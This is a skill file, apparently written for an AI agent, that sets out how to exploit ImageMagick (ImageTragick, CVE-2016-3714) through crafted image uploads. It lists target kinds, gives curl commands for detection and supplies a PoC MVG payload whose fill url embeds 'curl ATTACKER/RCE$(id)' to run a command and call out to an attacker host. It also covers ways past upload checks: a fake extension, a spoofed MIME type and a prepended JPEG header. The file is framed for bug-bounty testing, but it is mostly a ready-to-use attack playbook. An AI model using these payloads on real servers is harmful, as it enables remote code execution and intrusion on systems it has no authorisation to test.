---
name: imagemagick-rce
description: "Exploit ImageMagick (ImageTragick and its successors) through crafted MVG/SVG/MSL uploads for RCE, SSRF, and arbitrary file read on server-side image processing. Use when an upload triggers server-side resize, thumbnail, watermark, or document preview generation."
---

# ImageMagick (ImageTragick) RCE via File Upload

## Crown Jewel Targets

- Sites with avatar/profile photo upload with server-side resize
- Document preview/thumbnail generation services
- Image processing APIs (resize, convert, watermark)
- Legacy PHP applications using `convert` or `identify` commands
- Any upload endpoint where image is processed server-side

## Attack Surface Signals

- Image upload forms (avatar, product images, document preview)
- Server-side thumbnail generation visible in HTML
- Error messages containing "ImageMagick", "Magick", "convert"
- Image resize parameters in URLs (`?w=`, `?h=`, `?resize=`)

## Detection
```bash
# Check if site processes images
curl -s TARGET | grep -E "upload|avatar|image|thumbnail|resize|convert"
# Upload MVG/SVG to check processing
# Test X-Powered-By or error messages for ImageMagick version
curl -s TARGET/upload -F "file=@test.jpg" -D- | grep -i "imagemagick\|magick"
```

**Positive indicators:**
- Site has image upload/processing (avatar, thumbnail, document preview)
- Error leaks "ImageMagick" or "Magick" in response
- Images are resized/thumbnailed server-side

## Exploitation
1. Create malicious MVG file that triggers command execution on ImageMagick < 6.9.3-9 (CVE-2016-3714)
2. Upload as image file (rename to .jpg or use Content-Type: image/jpeg)
3. Server processes with ImageMagick → executes embedded shell command

## PoC Template
```
# evil.mvg — triggers on ImageMagick < 6.9.3-9
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl ATTACKER/RCE$(id))'
pop graphic-context
```

```bash
# Upload as avatar
curl -s -F "avatar=@evil.mvg;type=image/jpeg" TARGET/upload
# Check for DNS/HTTP callback to confirm RCE
```

## Important Notes
- ImageMagick 6.9.3-9+ patched but older versions still common on legacy apps
- Can also exploit via SVG with embedded `<image>` tags pointing to malicious URLs
- Yahoo Bleed variants: even reading 18 bytes from memory confirmed SSRF/LFI potential
- Some servers validate file magic bytes — prepend valid JPEG header before MVG payload

## Reference Writeups
- [Exploiting ImageMagick to get RCE on Polyvore (Yahoo)](http://nahamsec.com/exploiting-imagemagick-on-yahoo/) by NaHamSec
- [Exploiting ImageMagick to get RCE on HackerOne](https://hackerone.com/reports/135072)
- [Trello bug bounty: Access server files using ImageTragick](https://hethical.io/trello-bug-bounty-access-servers-files-using-imagetragick/) by Florian Courtial
- [Yahoo Bleed 1 — 18-byte file, $14k bounty](https://scarybeastsecurity.blogspot.hk/2017/05/bleed-continues-18-byte-file-14k-bounty.html)

## Operator Notes (Battle-Tested)

- **Upload as `.jpg` with `Content-Type: image/jpeg`**: Servers often validate extension/MIME but not content. MVG payload with image extension bypasses most checks.
- **Interactsh for OOB confirmation**: Use DNS/HTTP callback in the MVG `url()` payload to confirm execution without destructive commands.
- **Prepend valid JPEG header**: Some servers validate magic bytes. Prepend `\xFF\xD8\xFF` before MVG payload.
- **ImageMagick 6.9.3-9+ patched but still found**: Legacy apps, embedded systems, and containerized deployments often run old versions.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `file-upload-testing` → `references/polyglot-file-upload-rce.md` | Polyglot image + code execution |
| `file-upload-testing` | General upload exploitation |
| `command-injection-testing` | Command injection via image processing |
| `ssrf-testing` | SSRF via SVG/MVG image processing |
